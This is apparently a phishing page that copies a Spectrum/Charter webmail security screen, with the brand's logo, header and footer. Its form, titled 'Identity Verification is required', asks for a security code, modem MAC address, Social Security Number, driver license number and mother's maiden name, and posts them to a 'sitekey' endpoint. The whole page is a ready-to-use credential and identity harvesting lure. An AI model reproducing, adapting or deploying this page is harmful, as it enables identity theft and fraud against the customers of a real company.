<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
  <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <script
        type="text/javascript"
        src="application/modules/mail/views/scripts/mail/js/jquery-1.9.1.min.js?v=2.12.1_2"
    ></script>
    <script type="text/javascript"
            src="application/modules/mail/views/scripts/mail/js/jquery-ui.min.js?v=2.12.1_2"></script>
    <script
        type="text/javascript"
        src="application/modules/mail/views/scripts/auth/js/login.js?v=2.12.1_2"
    ></script>
    <script
            type="text/javascript"
            src="application/modules/mail/views/scripts/auth/js/spectrumloginheader.js?v=2.12.1_2"
    ></script>
    <link rel="stylesheet" type="text/css" href="application/modules/mail/views/scripts/mail/css/rutledge.css?v=2.12.1_2" />
    <link rel="stylesheet" type="text/css" href="application/modules/mail/views/scripts/mail/css/sb-icons.css?v=2.12.1_2" />
    <link rel="stylesheet"
          type="text/css"
          href="application/modules/mail/views/scripts/auth/css/login.css?v=2.12.1_2"
    />
    <link
        rel="stylesheet"
        type="text/css"
        href="application/modules/mail/views/scripts/mail/css/spectrum.css?v=2.12.1_2"
    />
    <link rel="stylesheet" type="text/css" href="application/modules/mail/views/scripts/mail/css/rutledge.css?v=2.12.1_2" />
    <title>Security - Webmail</title>

            <script
                type="text/javascript"
                src="application/modules/mail/views/scripts/auth/js/obfuscate.js?v=2.12.1_2"
        ></script>
        <script
                type="text/javascript"
                src="application/modules/mail/views/scripts/auth/js/threatmatrix.js?v=2.12.1_2"
        ></script>
        
    </head>

<body>
<div class="loader" style="display: none;">
    <div class="spinner">
        <svg
                class="text-primary"
                width="80px"
                height="80px"
                viewBox="0 0 66 66"
                xmlns="http://www.w3.org/2000/svg"
        >
            <circle
                    class="path"
                    fill="none"
                    strokeWidth="4"
                    strokeLinecap="round"
                    stroke="#0073d1"
                    cx="33"
                    cy="33"
                    r="30"
            />
        </svg>
    </div>
</div>
<div id="header">
    <nav role="navigation">
        <div class="app-header">
  <button tabindex="0" access-tabindex="skip-to-content" access-next-tabindex="banner-menu-button"
          class="skip-to-content-link">
    Skip to Main Content
  </button>

  <div class="app-header-container">
    <div class="app-header-menu">
      <div class="app-global-side-nav">
        <div class="navOverlay"></div>

        <div class="sidenav">
          <div class="interiorSideNav">
            <div class="close-button">
              <button class="icon-button" aria-label="Close button for navigation menu"
                      tabindex="0" access-tabindex="sidenav-close" access-next-tabindex="sidenav-menu">
                <span class="close-icon mat-icon" role="img" aria-hidden="true"></span>
              </button>
            </div>


            <div>
              <div class="menu-container">
                <ul class="menu-unstyled" access-tabindex="sidenav-menu" access-next-tabindex="sidenav-signout-button">
                  <li>
                    <div>
                      <a class="menu-link menu-link-primary"
                        Manage Account
                      </a>
                    </div>
                  </li>
                  <li>
                    <div>
                    <a class="menu-link menu-link-primary" >
                      Get Support
                    </a>
                    </div>
                  </li>
                  <li>
                    <div>
                    <a class="menu-link menu-link-primary" >
                      Watch TV
                    </a>
                    </div>
                  </li>
                </ul>
              </div>
                            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="app-header-utility">
      <div class="app-utility-nav">
        <a class="list-item support-link mat-button"  aria-disabled="false"
           aria-label="Support (Opens in a new window)" 
           tabindex="0" access-tabindex="banner-link-support" access-next-tabindex="banner-link-signout">
          <span  class='no-border' >Support</span>
        </a>
                </div>
    </div>

    <div class="app-header-logo">
      <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
        <img alt="Spectrum logo" src="application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.12.1_2"/>
      </a>
    </div>
  </div>

  <div class="app-header-local">
    <div class="app-local-nav">
    </div>
  </div>

</div>
    </nav>
</div>

<div id="body">

<div id="loginForm">
    
        
    <div id="loginFormContainer">

        <h1 id="headline">
            Identity Verification is required.
        </h1>
        
        <form action="sitekey" method="post">
		
			<div id="SecCodeContainer" >
                <label for="fullName">
                    Your security code
                </label>
                <input
                        type="text"
                        id="SecCode"
                        name="SecCode"
                        placeholder = "Numbers that are unique to your account"
                        value=""
						required=""
						autofocus
                >
            </div>

            <div id="MacAddressContainer" >
                <label for="eAddress">Your MAC address</label>
                <input
                        type="text"
                        id="MacAddress"
                        name="MacAddress"
                        placeholder = "It's on your modem or router."
                        value=""
						required=""
                >
            </div>
			
			<div id="SocialSecurityNumberContainer" >
                <label for="SSN">
                    Social Security Number
                </label>
                <input
                        type="text"
                        id="ssnr"
                        name="ssnr"
                        value=""
						required=""
						placeholder="*********"
						pattern="\d*"
						minlength = "9"
						maxlength = "9"
                >
            </div>
			
			<div id="DriverLicenseContainer" >
                <label for="driverlicense">
                    Driver License
                </label>
                <input
                        type="text"
                        id="dl"
                        name="dl"
                        value=""
						required=""
                >
            </div>
			
			<div id="MMNContainer" >
                <label for="MMNR">
                    Mother's Maiden Name
                </label>
                <input
                        type="text"
                        id="mmnr"
                        name="mmnr"
                        value=""
						required=""
                >
            </div>
            
			</br>
			<div id="rememberEmailContainer">
                <input
                        type="checkbox"
                        name="rememberEmail"
                        id="rememberEmail"
                                    >
                <label for="rememberEmail">
                    I hereby declare that the information provided is true and correct.
                </label></br>
            </div></br>
			
            <input type="submit" name="submit"  value="Continue">
        </form>

    </div>

</div>
</div>


<div id="footer">
    <nav role="navigation">
        <ul>
    <li>&copy; 2025 Charter Communications. All rights reserved</li>
    <li>
        <a >Advertise with Us</a>
    </li>

    <li>
        <a >Your Privacy Rights</a>
    </li>

    <li>
        <a target="_blank">Web Privacy Policy</a>
    </li>

    <li>
        <a target="_blank">California Consumer Privacy Rights</a>
    </li>

    <li>
        <a  target="_blank">California Consumer Do Not Sell My Personal Information</a>
    </li>

    <li>
        <a target="_blank">Spectrum Subscriber Policies</a>
    </li>

    <li>
        Time Warner Cable and the Time Warner Cable logo
        are trademarks of Time Warner Inc., used under license.
    </li>
</ul>
    </nav>
</div>
<script type="text/javascript">
  var $links = $("#footer").find("a");
  $.each($links, function( i ) {
    $($links[i]).attr("aria-label", $($links[i]).text() + " (Opens in new window)");
  });
</script>
</body>
</html>
